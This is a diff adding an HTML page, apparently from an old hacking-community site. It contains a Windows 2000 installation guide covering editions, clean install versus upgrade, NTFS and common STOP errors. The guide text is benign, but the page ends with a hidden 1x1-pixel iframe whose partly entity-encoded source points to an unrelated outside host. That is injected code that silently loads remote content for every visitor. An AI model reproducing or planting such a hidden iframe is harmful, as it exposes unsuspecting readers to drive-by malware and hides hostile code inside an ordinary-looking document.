@@ -1,0 +1,173 @@
+<html>
+<head>
+<title>Windows 2000 Easy Installation Guide</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>Windows 2000 Easy</b>       I   Written by:     /
+    >                     I     <b>Installation Guide</b>      I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <a href="mailto:cypher@cypherdome.com">Cypher</a>          \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<hr width="75%" align="center">
+<p>Disclaimer: This guide is based on my personal knowledge only, and should not be considered as an alternative
+for certified Microsoft installation procedures.<br>
+The author takes no responsibility for your actions.</p>
+<hr width="75%" align="center">
+<p>This is the first article out of a series of Windows 2000 related tutorials and guides.
+Check BSRF site for updates.</p>
+<h3>=====> An overview on Microsoft Windows 2000 family <=====</h3>
+<p>This tutorial will make your Windows 2000 installation easy, smooth, and almost effortless.
+First thing – decide what distribution of Windows 2000 are you going to install:
+Microsoft has released (for now) 3 different Windows 2000 releases:<br>
+<ul>
+  <li>Windows 2000 Professional</li>
+  <li>Windows 2000 Server</li>
+  <li>Windows 2000 Advanced Server</li>
+  <li>Windows 2000 Datacenter Server</li>
+</ul></p>
+<p>The Microsoft Windows 2000 caries the "Built on NT Technology logo" to symbolize its belonging to the NT technology.
+It also features a true multi-lingual support making it easy to switch between different language packs.
+It is meant to:</p>
+<h4>== Keep the stability and performance of the NT technology ==</h4>
+<p>Windows 2000 keeps the traditional values of all NT systems: Stability, Performance, and Information Security.
+It features the new NTFS 5.0, which allows high information security values by giving the user the ability to encrypt the file
+system (EFS), assigning closed and secured space to use VPN, unleashing the Kerberos security system, user quotas, and much more.</p>
+<h4>== To lower the Total Cost of Ownership (TCO) ==</h4>
+<p>Windows 2000 has many built-in capabilities, such as IntelliMirror and the Active Directories. These features allow
+more efficient business solutions and management.</p>
+<h3>[== Different Releases ==]</h4>
+<ul>
+  <li>The Professional edition is targeting the home and the small business markets, or as Microsoft says, “desktop operating
+      system for the Business Internet”.</li>
+  <li>The Server edition is for the average organization network. It includes much more server, network management, and
+  administration tools. Featuring Active Directories, Kerberos and PKI systems, Windows Terminal Services, and more.
+  The Windows 2000 Server supports up to 4GB of RAM and 4 processors.</li>
+  <li>The Advanced Server edition was released for major networks and corporations. It features support up
+  to 8 processors, excellent load management, and surprising stability. The Advanced Server release features
+  the Enterprise Memory Architecture - EMA, improved Symmetric Multiprocessing - SMP, imporoved databases performance.</li>
+</ul>
+<p>I’ll mostly focus on the professional release, because it’s meant for home and small business users, while the other
+two mostly useful for large organization with major networks.<br>
+I assume you already have the installation disk so I’m not going to explain where to get it and how much does it
+cost. I’ll just note that one can get it free with an MSDN subscription or to buy it in a local computing store.</p>
+<h4>=====> "Let the games begin" or Installing Windows 2000 <=====</h4>
+<h3>[=== Clean or Upgrade ===]</h3>
+<p>I’ve been asked this question many times and answer is quite simple – it depends on your needs. Lets reviewthe
+pros and the cons of a clean installation and an upgrade</p>
+<ul>
+  <li>The biggest advantage of a clean setup is that you’re relatively safe from various drivers and
+  applications incompatibilities. If you install Windows 2000 on an existing Windows installation, Win2k
+  might use the old driver already on your system, which may lead to system instabilities.</li>
+  <li>On the other hand, it is obvious that when you perform an upgrade all your already-installed programs
+  will function under the new OS.</li>
+</ul>
+<p>So it’s up to you to decide, to upgrade or to perform a clean installation.</p>
+<p>To be on the safe side – do a clean installation, but if you’re unable to reinstall
+your entire software – upgrade.</p>
+
+<h3>-> The Setup <-</h3>
+<p>(Note: Choose the most convenient way to run setup. The first one is both for upgrading
+and clean installations)</p>
+<p><b>Running Setup 1:</b> Now, after making that important decision, insert the Win2k installation CD into the CD drive,
+while in Windows, and start the setup program (it’ll autorun if the feature is enabled on your system, else run
+the “setup.exe” file at the CD root directory).<br>
+On the first screen, choose whether to Upgrade or to perform a Clean Installation.</p>
+<p><b>Running Setup 2:</b> (for clean installation only)<br>
+In case you don’t have previous version of Windows installed, you can boot directly into the setup.
+First, enable CD-ROM boot in your BIOS (be careful, don’t change anything unless you’re completely sure
+what you’re doing. Consult the vendor manual), then insert the CD and boot your computer. If your BIOS cannot
+boot from a CD-ROM drive, you can make boot diskettes with the Boot-Maker program, included on the installation
+CD (\bootdisk\makeboot.exe).<br>
+Installation (basic configuration and copying files)<br>
+Follow the setup wizard to perform pre-installation basic configuration.</p>
+<p>After a few system diagnostics the setup will begin copying the files.<br>
+After the file copying has finished setup will restart the computer and boot to Windows 2000 core for
+the next stage of the installation. This phase of the installation is in MS-DOS like environment, but it
+is Windows 2000 Core which performs it.</p>
+<h4>[== NTFS or FAT? ==]</h4>
+<p>NTFS is much faster, reliable, and high-performance file system then FAT32 or FAT. I highly recommend
+choosing to upgrade the drive to NTFS. But, note that in case you have a dual boot system, other operating
+systems won’t see the NTFS partition, i.e. you won’t be able to access that partition from DOS or from Windows 9x.</p>
+<h4>[== Components to install ==]</h4>
+<p>This is your personal decision, according to your needs. I can only describe the main
+components and their purpose.</p>
+<h4>IIS – Internet Information Services:</h4>
+<p>In case you plan to run your own web, ftp, and/or mail server – install the pack. Another usage to IIS is for
+local testing of ASP files, which also require you to install the IIS web server. Anyhow, you can always install
+or remove it later, through the control panel.<br>
+IIS allows creating multiple sites on one IP address, making it easy creating Intranet sites.<br>
+IIS features support for dynamic content, such as ASP, CGI and ISAPI, allowing web developers to include
+ActiveX components into their web sites. IIS has the Secure Socket Layer (SSL) providing safe data transfer
+between the client and the server.<br>
+Another major feature of IIS 5.0 is its ability to be administared over the web, using the Administration
+Web Site snap-in.</p>
+<h4>Indexing Service</h4>
+<p>The indexing service is useful on large hard disks with a good performance. It indexes the files on
+the system for faster searching capabilities. It allows searching within files on the hard
+disk for specific words.<br>
+You can control and manage the Indexing Service through its snap-in console in the MMC. You can
+check the indexing proccess, choose the directories to be indexed, and configure the service for
+optimal performance.</p>
+<p>The other components are mainly network-related, and unnecessary unless you’re a part of a LAN (Local Area Network).</p>
+
+<h3>[== Troubleshooting ==]</h3>
+<p>Like most Microsoft products, Windows 2000 has a user-friendly and simple setup interface.
+But, some errors might still surface.</p>
+<p><b>-> STOP Errors</b><br>
+In case you get a one-time STOP error (aka BSoD – Blue Screen of Death) just reboot, and setup will
+resume the installation. But if you keep getting STOP errors, you might have a hardware that is incompatible
+with Windows 2000. In that case you should consult the HCL - Windows 2000 Hardware Compatibility List
+(included on installation CD, \support\hcl.txt), and/or download the Microsoft Windows 2000 compatibility
+check program (on Microsoft’s web site).</p>
+<p>Here are some of the most common STOP errors in Windows 2000 and their explanation:</p>
+<p><b>- IRQL_NOT_LESS_OR_EQUAL -</b><br>
+Meaning that the core tried to gain access to a certain memory segment which is at a higher level
+of an Interupt Request Level (IRL) then allowed. While the proccess only allowed to have access to
+and IRL level no higher then their own.</p>
+<p>Recommendation: This error is probably caused by a faulty driver or a system service. Try using the
+"Last Good Known Configuration" option in the safe boot menu (F8 on boot).</p>
+<p>Note: If the error surfaces while installing Windows, check that all of your drivers are compatible
+with Windows 2000 (consult the HCL).</p>
+<p><b>- KMODE_EXCEPTION_NOT_HANDLED -</b><br>
+This error is generated when the core can't handle a certain directive.</p>
+<p>Recommendation: The error might show you the name of the faulty driver.
+Try disabling it while booting into Safe Mode.</p>
+<p>Note: The situation can sometimes resolved using the Recovery Console.</p>
+<p><b>- NTFS_FILE_SYSTEM -</b><br>
+This error is generated when there is a problem with the Ntfs.sys driver, which is meant
+to access information on NTFS drives.</p>
+<p>Recommendation: Check your IDE/SCSI HD drivers for compatibility, and execute the
+chkdsk command to verify data consistency.</p>
+<p>There are more STOP errors in Windows 2000 then I could review in this article.
+Consult the Microsoft Knowledge Base on <a href="http://www.microsoft.com" target="_blank">www.microsoft.com</a>.</p>
+<p>&nbsp;</p>
+<p>==========[ That's it for now<br>
+=====[ If you have any question mail me at <a href="mailto:cypher@cypherdome.com">cypher@cypherdome.com</a></p>
+<p>CheerZ,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Cypher.</p>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
